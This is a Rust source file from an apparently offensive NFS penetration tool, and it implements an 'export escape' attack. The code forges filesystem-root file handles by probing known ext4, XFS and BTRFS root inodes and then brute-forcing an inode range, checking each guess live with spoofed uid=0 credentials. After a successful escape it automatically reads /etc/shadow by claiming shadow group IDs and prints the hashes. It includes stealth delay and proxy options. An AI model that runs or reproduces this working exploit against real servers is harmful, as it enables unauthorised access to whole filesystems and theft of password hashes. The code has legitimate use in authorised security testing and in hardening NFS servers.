//! Export escape: construct a root file handle for the underlying
//! filesystem and verify it live.
//!
//! Most NFS exports trust the file handle the client presents (RFC 1094
//! S2.3.3 -- handles are bearer tokens). When the server does not validate
//! that a handle's inode falls inside the export's subtree, an attacker
//! can construct a handle pointing at the filesystem root (ext4 inode 2,
//! XFS inode 128, BTRFS subvolume 256, etc.) and read/write anything on
//! the underlying filesystem. This module is the single entry point for
//! that primitive: it prints a hex root handle which the operator passes
//! to `shell --handle` or any other module that takes `--handle HEX`.

use clap::Parser;
use colored::Colorize as _;

use crate::cli::probe::{make_client_with_hostname, make_mount_client, parse_addr_with_port};
use crate::cli::{GlobalOpts, H_BEHAVIOR, H_TARGET};
use crate::engine::file_handle::{EscapeResult, FileHandleAnalyzer};
use crate::proto::auth::{AuthSys, Credential};
use crate::proto::nfs3::types::FileHandle;
use crate::proto::nfs3::{Nfs3Client, PooledNfs3 as _};
use crate::util::stealth::StealthConfig;
use nfswolf_nfs3::FileType;

/// Escape an export to the filesystem root via subtree_check bypass.
///
/// Tries to reach the filesystem root outside the exported directory by
/// constructing a file handle with the root inode (ext4: 2, XFS: 128/64,
/// BTRFS: 256+). The server accepts the handle without verifying it is
/// within the export boundary.
///
/// Strategy (automatic, no flags needed):
///   1. Probe known root inodes for the detected filesystem type.
///   2. If those return STALE, scan inodes 2-200 -- the root is always there.
///   3. For BTRFS, enumerate subvolume IDs starting at 256.
///
/// The printed handle is verified live (GETATTR returns NFS3_OK or ACCES,
/// not STALE) before being shown. Pass it to `shell --handle` to browse
/// the full filesystem.
///
/// Examples:
///   nfswolf escape 192.168.1.10:/srv
///   nfswolf escape 192.168.1.10 --export /srv --btrfs-subvols 32
#[derive(Parser)]
pub(crate) struct EscapeArgs {
    /// Target host with optional :/export suffix (e.g. 10.0.0.5:/srv)
    #[arg(help_heading = H_TARGET, value_name = "TARGET")]
    pub target: String,

    /// Export path (alternative to host:/export in the positional target)
    #[arg(short = 'e', long, value_name = "PATH", help_heading = H_TARGET)]
    pub export: Option<String>,

    /// Number of BTRFS subvolume IDs to try (starting at 256)
    #[arg(long, default_value_t = DEFAULT_BTRFS_SUBVOLS, value_name = "N", help_heading = H_BEHAVIOR)]
    pub btrfs_subvols: u32,

    /// Inode scan depth for the fallback brute-force pass.
    /// The root inode is always within the first 200 inodes on any Linux
    /// filesystem, so the default covers all practical cases.
    #[arg(long, default_value_t = DEFAULT_MAX_ROOT_SCAN, value_name = "N", help_heading = H_BEHAVIOR)]
    pub max_root_scan: u32,
}

/// Default BTRFS subvolume scan count. Shared with `scan --auto-escape` so the
/// auto pass uses the same depth as a manual `escape` invocation.
pub(crate) const DEFAULT_BTRFS_SUBVOLS: u32 = 16;

/// Default inode-scan depth for the escape fallback pass. The root inode is
/// always within the first 200 inodes on any Linux filesystem. Shared with
/// `scan --auto-escape`.
pub(crate) const DEFAULT_MAX_ROOT_SCAN: u32 = 200;

/// Outcome of an escape attempt against a single export.
///
/// Returned by [`find_escape`] so callers decide how to render it: the `escape`
/// subcommand prints a verbose report (and reads /etc/shadow on success), while
/// `scan --auto-escape` prints a one-line-per-export summary.
#[derive(Debug)]
pub(crate) enum EscapeOutcome {
    /// A filesystem-root handle was constructed and verified live (GETATTR
    /// returned NFS3_OK on a directory, or ACCES -- format accepted).
    Success {
        /// The verified root handle plus its filesystem fingerprint.
        candidate: EscapeResult,
        /// How the handle was found (e.g. "verified", "found via scan").
        note: String,
    },
    /// Handle format is valid (STALE hits) but the root inode was not found
    /// within `2..=max_root_scan` -- a higher `--max-root-scan` may help.
    StaleNoRoot,
    /// The server rejected the handle format entirely (BADHANDLE): the export
    /// is not escapable with this technique (non-Linux server, signed handles).
    Unsupported,
}

/// Run the escape command.
pub(crate) async fn run(args: EscapeArgs, globals: &GlobalOpts) -> anyhow::Result<()> {
    let target = crate::cli::target::parse(&args.target, args.export.as_deref(), None, true)?;
    let host = target.host.to_string();
    let export = target.export().unwrap_or("/").to_owned();

    run_inner(&host, &export, args.btrfs_subvols, args.max_root_scan, globals).await?;
    crate::cli::emit_replay(globals);
    Ok(())
}

/// Strategy (fully automatic, no flags needed):
///   1. Mount the export and detect the filesystem type from the handle format.
///   2. Probe known root inodes for the detected type.
///   3. If all known candidates return STALE, fall back to scanning
///      inodes 2..=max_root_scan.
///
/// The printed handle is confirmed live (GETATTR returns NFS3_OK or ACCES) before
/// being shown. ACCES counts as a hit -- the handle format is valid; only the
/// credential is rejected.
async fn run_inner(host: &str, export: &str, btrfs_subvols: u32, max_root_scan: u32, globals: &GlobalOpts) -> anyhow::Result<()> {
    eprintln!("{}", crate::output::status_info(&format!("Escaping export {host}:{export}")));

    // Try NFSv3 first; fall back to NFSv2 if MOUNT v3 fails.
    let result = find_escape(host, export, btrfs_subvols, max_root_scan, globals, true).await;
    let (probe_client, outcome) = match result {
        Ok(r) => r,
        Err(v3_err) => {
            eprintln!("{}", crate::output::status_info("MOUNT v3 failed; trying NFSv2 escape"));
            let outcome = match find_escape_v2(host, export, max_root_scan, globals).await {
                Ok(o) => o,
                Err(v2_err) => {
                    eprintln!("{}", crate::output::status_err(&format!("MOUNT failed on both v3 and v1 -- export may not exist or server is unreachable")));
                    eprintln!("  v3: {v3_err}");
                    eprintln!("  v1: {v2_err}");
                    return Ok(());
                },
            };
            match outcome {
                EscapeOutcome::Success { candidate, note } => {
                    print_escape_success(&candidate, &note, host);
                },
                EscapeOutcome::StaleNoRoot => {
                    eprintln!("{}", crate::output::status_err(&format!("NFSv2: handle format valid (STALE) but root not found in inodes 2..={max_root_scan}.")));
                },
                EscapeOutcome::Unsupported => {
                    eprintln!("{}", crate::output::status_err("NFSv2: handle format rejected or export is already the filesystem root."));
                },
            }
            return Ok(());
        },
    };

    match outcome {
        EscapeOutcome::Success { candidate, note } => {
            print_escape_success(&candidate, &note, host);
            try_read_shadow_post_escape(&probe_client, &candidate.root_handle).await;
        },
        EscapeOutcome::StaleNoRoot => {
            eprintln!("{}", crate::output::status_err(&format!("Handle format is valid (STALE hits) but root not found in inodes 2..={max_root_scan}. Try --max-root-scan with a higher value.")));
        },
        EscapeOutcome::Unsupported => {
            eprintln!("{}", crate::output::status_err("Export escape not available -- the export already is the filesystem root, or the server rejected the handle format (BADHANDLE / non-Linux)"));
        },
    }
    Ok(())
}

/// Try NFSv3 escape first, then NFSv2 fallback. Returns just the outcome
/// (no client). Used by `scan --auto-escape` which doesn't need the client
/// for post-escape reads.
pub(crate) async fn find_escape_any(host: &str, export: &str, btrfs_subvols: u32, max_root_scan: u32, globals: &GlobalOpts, announce: bool) -> anyhow::Result<EscapeOutcome> {
    match find_escape(host, export, btrfs_subvols, max_root_scan, globals, announce).await {
        Ok((_client, outcome)) => Ok(outcome),
        Err(_) => find_escape_v2(host, export, max_root_scan, globals).await,
    }
}

/// NFSv3 export-escape primitive.
///
/// Mounts `host:export`, builds a uid=0 probe client, and searches for a working
/// filesystem-root handle (ext4/XFS known inodes first, then BTRFS subvolumes, then a
/// fallback inode scan). Returns the probe client -- so the caller can perform
/// post-escape reads such as /etc/shadow -- together with the [`EscapeOutcome`].
///
/// Per-candidate progress lines are written to stderr only when `announce` is
/// set. Bulk callers (`scan --auto-escape`) pass `false` and print their own
/// one-line-per-export summary instead.
pub(crate) async fn find_escape(host: &str, export: &str, btrfs_subvols: u32, max_root_scan: u32, globals: &GlobalOpts, announce: bool) -> anyhow::Result<(Nfs3Client, EscapeOutcome)> {
    let addr = parse_addr_with_port(host, globals.nfs_port)?;
    let mount = make_mount_client(globals);
    let mnt = mount.mount(addr, export).await?;

    // Honour the global stealth delay on the probe path (every RPC path must
    // respect StealthConfig); with the default --delay 0 this is a no-op.
    // `globals.nfs_port` routes the probe client straight to the NFS port when
    // portmapper is firewalled.
    let (_, _, probe_client) = make_client_with_hostname(addr, export, 0, 0, &[], StealthConfig::new(globals.delay, globals.jitter), globals.proxy.as_deref(), globals.nfs_port, &globals.hostname);

    // The export root's own inode. A candidate handle that resolves to this same
    // inode has crossed no boundary (whole-filesystem export, incl. the
    // compound-UUID XFS case `export_is_fs_root` cannot fingerprint), so it must
    // not be reported as an escape (#22/#48). `None` when root_squash blocks the
    // uid=0 GETATTR -- then we fall back to the format/known-inode signals.
    let export_fileid: Option<u64> = match probe_client.attrs(&mnt.handle).await {
        Ok(a) => Some(a.fileid),
        _ => None,
    };

    // Guard: if the export already IS the filesystem root there is nothing outside the
    // export to reach -- reconstructing inode 2 / 128 just reproduces a handle inside the
    // export, whose GETATTR (OK+NF3DIR) would otherwise be reported as a bogus "escape
    // successful". Short-circuit here so the guard covers Phase 1 AND the Phase-2 scan
    // (nfs_analyze applies the same `export_fileid in [2, 128]` check).
    if export_is_fs_root(&probe_client, &mnt.handle).await {
        if announce {
            eprintln!("{}", crate::output::status_info(&format!("Export {host}:{export} already is the filesystem root -- nothing outside the export to reach")));
        }
        return Ok((probe_client, EscapeOutcome::Unsupported));
    }

    // --- Phase 1: known root inodes, ordered ext4 -> XFS -> BTRFS ---

    // ext4 (inode 2) and XFS candidates (128/64/32) first -- cheapest probes.
    let known: Vec<EscapeResult> = FileHandleAnalyzer::construct_root_candidates(&mnt.handle);
    for candidate in &known {
        if announce {
            eprintln!("{}", crate::output::status_info(&format!("Probing {:?} inode {} ...", candidate.fs_type, candidate.inode_number)));
        }
        if probe_escape_candidate(&probe_client, candidate, export_fileid, &mnt.handle).await {
            return Ok((probe_client, EscapeOutcome::Success { candidate: candidate.clone(), note: "verified".to_owned() }));
        }
    }

    // BTRFS subvolume IDs (5, then 256..256+btrfs_subvols) last -- more expensive.
    let btrfs = FileHandleAnalyzer::construct_btrfs_subvol_handles(&mnt.handle, btrfs_subvols);
    let mut announced = std::collections::HashSet::with_capacity(btrfs.len());
    for candidate in &btrfs {
        if announce && announced.insert(candidate.inode_number) {
            eprintln!("{}", crate::output::status_info(&format!("Probing BTRFS subvol {} ...", candidate.inode_number)));
        }
        if probe_escape_candidate(&probe_client, candidate, export_fileid, &mnt.handle).await {
            return Ok((probe_client, EscapeOutcome::Success { candidate: candidate.clone(), note: "subvolume (verified)".to_owned() }));
        }
    }

    // --- Phase 2: fallback scan (inodes 2..=max_root_scan) ---
    if announce && !known.is_empty() {
        eprintln!("{}", crate::output::status_warn(&format!("Known candidates returned STALE -- scanning inodes 2..={max_root_scan}")));
    }

    let seed = &mnt.handle;
    let mut found_stale = false;

    for inode in 2..=max_root_scan {
        let Some(candidate) = FileHandleAnalyzer::construct_handle_for_inode(seed, inode, 0) else {
            continue;
        };

        match probe_client.attrs(&candidate.root_handle).await {
            Ok(a) if a.file_type == FileType::Directory => {
                // A directory hit alone is not the root: inode numbers are dynamic
                // (XFS), so the first directory in 2..200 can be an arbitrary
                // subdirectory. Confirm it is not the export itself (identity) and
                // is genuinely the filesystem root (its own parent) before
                // declaring success (#27).
                let self_id = a.fileid;
                if export_fileid.is_none_or(|exp| self_id != exp) && scan_hit_is_root(&probe_client, &candidate.root_handle, self_id).await {
                    return Ok((probe_client, EscapeOutcome::Success { candidate, note: "found via scan (confirmed root)".to_owned() }));
                }
                found_stale = true; // valid format + directory, but not the root -- keep scanning
                tracing::debug!(inode, "scan hit a directory but not the filesystem root -- continuing");
            },
            Ok(_) => {
                tracing::debug!(inode, "scan hit non-directory inode (within export subtree)");
            },
            Err(ref e) if e.is_permission_denied() => {
                // ACCES proves only that the handle FORMAT was accepted (root_squash blocks
                // the uid=0 read) -- it is returned by ANY protected inode, so a bare ACCES
                // is NOT proof that this inode is a directory, let alone the filesystem root.
                // Confirm positively before declaring success; otherwise a random 0700
                // subdirectory in the scan range would be mislabelled as the root.
                found_stale = true; // the format is valid even when root cannot be confirmed
                if confirm_root_dir(&probe_client, &candidate).await {
                    return Ok((probe_client, EscapeOutcome::Success { candidate, note: "found via scan (confirmed root dir; root_squash active)".to_owned() }));
                }
                tracing::debug!(inode, "ACCES but root not confirmed -- continuing scan");
            },
            Err(ref e) if e.is_stale() => {
                found_stale = true;
                tracing::debug!(inode, "STALE");
            },
            Err(stat) => {
                tracing::debug!(inode, ?stat, "probe rejected");
            },
            Err(e) => {
                tracing::debug!(inode, err = %e, "RPC error during escape scan");
            },
        }
    }

    let outcome = if found_stale { EscapeOutcome::StaleNoRoot } else { EscapeOutcome::Unsupported };
    Ok((probe_client, outcome))
}

/// True when the exported directory is itself the filesystem root (so there is nothing
/// outside the export to reach).
///
/// Uses fileid + directory-type heuristics. A directory export with fileid 2 is ext4
/// root; fileid 32/64/128 is XFS root (these are never regular directories on any FS).
/// The parent-is-self test (LOOKUP "..") is NOT used here because NFS servers clip
/// ".." at the export boundary, making every export look like a root.
async fn export_is_fs_root(client: &Nfs3Client, mount_handle: &FileHandle) -> bool {
    let Ok(ok) = client.attrs(mount_handle).await else {
        return false;
    };
    if ok.file_type != FileType::Directory {
        return false;
    }
    let export_inode = ok.fileid;
    // ext4/ext3/ext2: root is always inode 2.
    // XFS: root is 128 (v5, default), 64 (v4 512B inodes), or 32 (v4 1024B inodes).
    // On ext4, inodes 32/64/128 are metadata (journal, resize_inode) — never directories.
    // So a directory with fileid in {2, 32, 64, 128} is unambiguously a filesystem root.
    if matches!(export_inode, 2 | 32 | 64 | 128) {
        return true;
    }
    // BTRFS: every subvolume root has fileid 256, so fileid alone can't distinguish
    // "export IS the FS_TREE root" from "export is a user subvolume that could escape
    // to FS_TREE." Let the probe phase handle BTRFS — it will try FS_TREE (subvol 5)
    // and other subvols, and the identity check blocks self-matches.
    false
}

/// Probe a candidate handle with GETATTR and report whether it is a valid directory.
///
/// Two acceptance conditions:
/// - `NFS3_OK` AND `file_type == NF3DIR` -- handle is valid and points to a directory.
///   The directory check prevents false positives from non-root inodes that happen to
///   exist (on ext4, inode 128 is the journal file, not a directory).
/// - `NFS3ERR_ACCES` / `NFS3ERR_PERM` -- handle format was accepted (root_squash
///   blocks uid=0 reads on the root dir).
async fn probe_escape_candidate(client: &Nfs3Client, candidate: &EscapeResult, export_fileid: Option<u64>, export_handle: &FileHandle) -> bool {
    match client.attrs(&candidate.root_handle).await {
        Ok(a) => {
            if a.file_type != FileType::Directory {
                return false;
            }
            // For BTRFS, different subvolumes share the same root fileid (256 =
            // BTRFS_FIRST_FREE_OBJECTID), so fileid alone can't distinguish them.
            // Compare handle bytes: different handles = different subvolumes = escape.
            if candidate.root_handle.as_bytes() == export_handle.as_bytes() {
                return false;
            }
            // For non-BTRFS: a matching fileid means the constructed handle resolves
            // to the export's own root directory (whole-filesystem export).
            if candidate.fs_type != crate::engine::file_handle::FsType::Btrfs {
                if export_fileid.is_some_and(|exp| a.fileid == exp) {
                    return false;
                }
            }
            true
        },
        Err(ref e) if e.is_permission_denied() => true,
        _ => false,
    }
}

/// Definitive filesystem-root test for a fallback-scan directory hit: the root is
/// its own parent, so LOOKUP ".." resolves back to the same inode. A subdirectory
/// in the scan range (e.g. an XFS export with non-standard geometry) has a
/// different parent and is therefore rejected (#27).
async fn scan_hit_is_root(client: &Nfs3Client, handle: &FileHandle, self_fileid: u64) -> bool {
    // A filesystem root is its own parent, so ".." resolving back to the same
    // inode is the confirmation. The server may or may not return attributes
    // with the LOOKUP; fall back to a GETATTR when it does not.
    let Ok((parent, attrs)) = client.resolve(handle, "..").await else { return false };
    let parent_id = match attrs {
        Some(a) => a.fileid,
        None => match client.attrs(&parent).await {
            Ok(a) => a.fileid,
            Err(_) => return false,
        },
    };
    parent_id == self_fileid
}

/// Positively confirm a scan-hit candidate is a directory (ideally the filesystem root)
/// before accepting a bare ACCES as an escape.
///
/// During the fallback inode scan a uid=0 GETATTR returns ACCES whenever root_squash
/// blocks the read -- but EVERY protected inode returns ACCES, so ACCES alone is not
/// proof of root (it would otherwise mark a random 0700 subdirectory as the filesystem
/// root). Re-probe as the conventional root_squash anon identity (uid/gid 65534): the
/// real root dir is world-traversable (mode 0755), so a NF3DIR GETATTR -- or a successful
/// LOOKUP of a customary top-level entry (etc/bin/usr/...), which only the filesystem root
/// carries -- gives the positive signal a bare ACCES lacks.
async fn confirm_root_dir(client: &Nfs3Client, candidate: &EscapeResult) -> bool {
    // root_squash conventionally maps root -> anonuid 65534 (nobody); claim it directly so
    // perms on the root dir (0755) are evaluated against an ordinary unprivileged uid.
    let cred = Credential::Sys(AuthSys::with_groups(65534, 65534, &[65534], client.machinename()));
    let unpriv = client.with_credential(cred, 65534, 65534);

    // Positive signal 1: the handle resolves to a directory for a non-root uid.
    if let Ok(a) = unpriv.attrs(&candidate.root_handle).await
        && a.file_type == FileType::Directory
    {
        return true;
    }

    // Positive signal 2: a customary top-level entry resolves -- only the real filesystem
    // root carries these, so a successful LOOKUP confirms root.
    for name in ["etc", "bin", "usr", "var", "lib"] {
        if unpriv.resolve(&candidate.root_handle, name).await.is_ok() {
            return true;
        }
    }
    false
}

/// Print the successful escape result and next-step hints.
fn print_escape_success(candidate: &EscapeResult, note: &str, host: &str) {
    let hex = candidate.root_handle.to_hex();
    println!();
    println!("  {}  {:?}  (inode {}  {})", "Filesystem:".dimmed(), candidate.fs_type, candidate.inode_number, note);
    crate::output::print_handle("Root handle", &hex);
    crate::output::print_handle_next_steps(&hex, host);
    println!();
}

/// NFSv2 escape path for v2-only servers.
///
/// Uses MOUNT v1 to obtain the seed handle and Nfs2Client for GETATTR probes.
/// NFSv2 has no BADHANDLE oracle (all rejections are NFSERR_STALE per RFC 1094)
/// and handles are fixed 32 bytes. No post-escape shadow read (v2 has no ACCESS).
async fn find_escape_v2(host: &str, export: &str, max_root_scan: u32, globals: &GlobalOpts) -> anyhow::Result<EscapeOutcome> {
    use nfswolf_nfs2::{Nfs2Client, wire::{Nfs2FileHandle, FType}};
    use nfswolf_rpc::{rpc::opaque_auth, transport::direct::DirectTransport, transport::tokio::TokioIo};
    use crate::proto::auth::next_stamp;

    let addr = parse_addr_with_port(host, globals.nfs_port)?;
    let mc = make_mount_client(globals);
    let mnt = mc.mount_v1(addr, export).await?;
    let seed = mnt.handle;

    let nfs_port = globals.nfs_port.unwrap_or(2049);
    let nfs_addr = std::net::SocketAddr::new(addr.ip(), nfs_port);
    let stream = tokio::net::TcpStream::connect(nfs_addr).await?;
    let io = TokioIo::new(stream);
    let cred = AuthSys::new(0, 0, "nfswolf");
    let opaque = cred.to_opaque_auth(next_stamp());
    let transport = DirectTransport::with_auth(io, opaque, opaque_auth::default());
    let client = Nfs2Client::new(transport);

    let mut found_stale = false;

    // Phase 1: known root candidates
    let known = FileHandleAnalyzer::construct_root_candidates(&seed);
    for candidate in &known {
        let fh = Nfs2FileHandle::from_bytes(candidate.root_handle.as_bytes());
        match client.getattr(&fh).await {
            Ok(a) if a.ftype == FType::Directory => {
                return Ok(EscapeOutcome::Success { candidate: candidate.clone(), note: "verified (NFSv2)".to_owned() });
            },
            Err(e) if matches!(e.status(), Some(nfswolf_nfs2::NfsStat::Stale)) => {
                found_stale = true;
            },
            _ => {},
        }
    }

    // Phase 2: inode scan
    for inode in 2..=max_root_scan {
        let Some(candidate) = FileHandleAnalyzer::construct_handle_for_inode(&seed, inode, 0) else { continue };
        let fh = Nfs2FileHandle::from_bytes(candidate.root_handle.as_bytes());
        match client.getattr(&fh).await {
            Ok(a) if a.ftype == FType::Directory => {
                return Ok(EscapeOutcome::Success { candidate, note: "found via scan (NFSv2)".to_owned() });
            },
            Err(e) if matches!(e.status(), Some(nfswolf_nfs2::NfsStat::Stale)) => {
                found_stale = true;
            },
            _ => {},
        }
    }

    Ok(if found_stale { EscapeOutcome::StaleNoRoot } else { EscapeOutcome::Unsupported })
}

/// After a successful escape, automatically try to read /etc/shadow.
///
/// On Debian/Ubuntu, /etc/shadow is mode 0640 owned by root:shadow (GID 42).
/// On SUSE, shadow GID is 15. Reading succeeds even without no_root_squash
/// because we can claim GID 42/15 via AUTH_SYS.
async fn try_read_shadow_post_escape(client: &Nfs3Client, root_fh: &FileHandle) {
    // Shadow GIDs: 42 = Debian/Ubuntu, 15 = SUSE/openSUSE
    const SHADOW_GIDS: &[(u32, &str)] = &[(42, "Debian/Ubuntu shadow"), (15, "SUSE shadow")];

    let Ok((etc_fh, _)) = client.resolve(root_fh, "etc").await else { return };

    let Ok((shadow_fh, _)) = client.resolve(&etc_fh, "shadow").await else {
        eprintln!("{}", crate::output::status_info("/etc/shadow not found (non-standard OS or no shadow file)"));
        return;
    };

    for &(gid, label) in SHADOW_GIDS {
        let cred = Credential::Sys(AuthSys::with_groups(0, gid, &[gid], "nfswolf"));
        let shadow_client = client.with_credential(cred, 0, gid);
        if let Ok(chunk) = shadow_client.read_at(&shadow_fh, 0, 65536).await {
            let content = String::from_utf8_lossy(&chunk.data);
            eprintln!("{}", crate::output::status_ok(&format!("/etc/shadow readable via GID {gid} ({label}):")));
            for line in content.lines().take(10) {
                println!("  {line}");
            }
            return;
        }
    }

    eprintln!("{}", crate::output::status_info("/etc/shadow: not readable via shadow GID (root_squash active or shadow hardened)"));
}
